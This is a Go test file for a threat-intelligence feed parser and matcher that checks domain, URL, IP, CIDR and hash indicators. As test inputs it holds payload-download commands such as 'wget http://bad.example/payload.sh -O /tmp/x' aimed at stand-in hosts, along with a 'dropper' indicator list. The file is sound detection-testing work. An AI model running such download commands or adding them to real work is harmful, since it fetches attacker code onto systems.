package intel

import (
	"fmt"
	"path/filepath"
	"strings"
	"testing"
)

func loadString(t *testing.T, body string) *Feed {
	t.Helper()
	f, err := Parse(strings.NewReader(body), "test")
	if err != nil {
		t.Fatal(err)
	}
	return f
}

func TestClassifyAndMatch(t *testing.T) {
	f := loadString(t, `
# comment
evil.example
1.2.3.4
10.0.0.0/8|botnet range
http://bad.example/payload.sh|dropper
44d88612fea8a8f36de82e1278abb02f|eicar-md5
`)
	if f.Count() != 5 {
		t.Fatalf("expected 5 indicators, got %d (%+v)", f.Count(), f.CountByKind())
	}
	// domain + subdomain
	if h := f.MatchText("curl http://cdn.evil.example/x"); len(h) == 0 {
		t.Errorf("expected subdomain match for evil.example")
	}
	// url exact
	if h := f.MatchText("wget http://bad.example/payload.sh -O /tmp/x"); len(h) == 0 {
		t.Errorf("expected url match")
	}
	// ip literal
	if h := f.MatchText("connect 1.2.3.4 now"); len(h) == 0 {
		t.Errorf("expected ip match")
	}
	// cidr membership
	if h := f.MatchText("ssh 10.1.2.3"); len(h) == 0 {
		t.Errorf("expected cidr match for 10.1.2.3")
	}
	// hash
	if lbl, ok := f.MatchHash("44D88612FEA8A8F36DE82E1278ABB02F"); !ok || lbl != "eicar-md5" {
		t.Errorf("expected hash match, got %q %v", lbl, ok)
	}
}

func TestMembershipOnlyNoFalsePositive(t *testing.T) {
	f := loadString(t, "evil.example\n")
	if h := f.MatchText("curl https://example.com and https://good.org"); len(h) != 0 {
		t.Fatalf("unlisted domains must not match, got %+v", h)
	}
	// Must not match a bare TLD or parent of an unrelated domain.
	if h := f.MatchText("visit notevil.example.net"); len(h) != 0 {
		t.Fatalf("example.net must not match evil.example, got %+v", h)
	}
}

func TestMergeAndSaveRoundtrip(t *testing.T) {
	a := loadString(t, "1.1.1.1|a\n")
	b := loadString(t, "2.2.2.2|b\nevil.test|c\n")
	added := a.Merge(b)
	if added != 2 {
		t.Fatalf("expected 2 new indicators merged, got %d", added)
	}
	dir := t.TempDir()
	path := filepath.Join(dir, "feed.txt")
	if err := a.Save(path); err != nil {
		t.Fatal(err)
	}
	reload, ok, err := Load(path)
	if err != nil || !ok {
		t.Fatalf("reload failed: ok=%v err=%v", ok, err)
	}
	if reload.Count() != 3 {
		t.Fatalf("expected 3 after roundtrip, got %d", reload.Count())
	}
	if _, _, hit := reload.matchHost("2.2.2.2"); !hit {
		t.Errorf("merged ip lost in roundtrip")
	}
}

func TestLoadMissingIsNotError(t *testing.T) {
	f, ok, err := Load(filepath.Join(t.TempDir(), "nope.txt"))
	if err != nil || ok {
		t.Fatalf("missing feed should be (empty,false,nil), got ok=%v err=%v", ok, err)
	}
	if f.Count() != 0 {
		t.Errorf("missing feed should be empty")
	}
}

// Reapplying an overlapping feed must not grow the CIDR slice: unlike the
// map-backed kinds, CIDRs were once appended without dedupe.
func TestCIDRsDedupeOnParseAndMerge(t *testing.T) {
	f := loadString(t, "10.0.0.0/8|a\n10.0.0.5/8|dup\n192.168.0.0/16|b\n")
	// 10.0.0.5/8 masks to 10.0.0.0/8, the same network as the first line.
	if got := f.CountByKind()["cidr"]; got != 2 {
		t.Fatalf("parse left %d cidrs, want 2 (the duplicate range collapsed)", got)
	}
	before := f.CountByKind()["cidr"]
	g := loadString(t, "10.0.0.0/8|a\n192.168.0.0/16|b\n172.16.0.0/12|new\n")
	added := f.Merge(g)
	if got := f.CountByKind()["cidr"]; got != before+1 {
		t.Fatalf("merge grew cidrs to %d, want %d (only the new range)", got, before+1)
	}
	if added != 1 {
		t.Errorf("Merge reported %d new, want 1 (only 172.16.0.0/12)", added)
	}
	// A re-merge of the very same feed changes nothing.
	if f.Merge(g) != 0 {
		t.Error("re-merging the same feed must add nothing")
	}
}

// A feed longer than the cap is refused rather than returned as a complete
// partial feed whose tail was silently dropped.
func TestParseRefusesOversizedFeed(t *testing.T) {
	old := maxFeedBytes
	maxFeedBytes = 32
	defer func() { maxFeedBytes = old }()
	if _, err := Parse(strings.NewReader(strings.Repeat("1.2.3.4\n", 100)), "big"); err == nil {
		t.Fatal("a feed over the cap must be refused, not returned as complete")
	}
	f, err := Parse(strings.NewReader("evil.example\n1.2.3.4\n"), "small")
	if err != nil || f.Count() != 2 {
		t.Fatalf("a feed within the cap must parse: err=%v count=%d", err, f.Count())
	}
}

// MatchText examines only a fixed number of candidates per kind. When a listed
// indicator sits after the cut, the caller is told rather than left believing
// the (empty) result is a complete check.
func TestMatchTextReportsTruncation(t *testing.T) {
	f := loadString(t, "http://bad.example/payload.sh|dropper\n")
	if h := f.MatchText("wget http://bad.example/payload.sh"); len(h) == 0 {
		t.Fatal("setup: the listed URL should match when it is under the cap")
	}
	if _, trunc := f.MatchTextReportsTruncation("curl http://plain.example/x"); trunc {
		t.Error("a small body must not report truncation")
	}
	// A URL-only indicator (its host is not itself a listed domain) placed after
	// the URL candidate cap is not examined.
	var b strings.Builder
	for i := 0; i < maxURLCandidates; i++ {
		fmt.Fprintf(&b, "http://filler%d.example.invalid/x ", i)
	}
	b.WriteString("http://bad.example/payload.sh")
	hits, trunc := f.MatchTextReportsTruncation(b.String())
	if !trunc {
		t.Fatal("a body over the URL candidate cap must report truncation")
	}
	for _, h := range hits {
		if strings.Contains(h.Value, "bad.example") {
			t.Fatalf("the indicator after the cut must not be reported as matched: %+v", h)
		}
	}
}
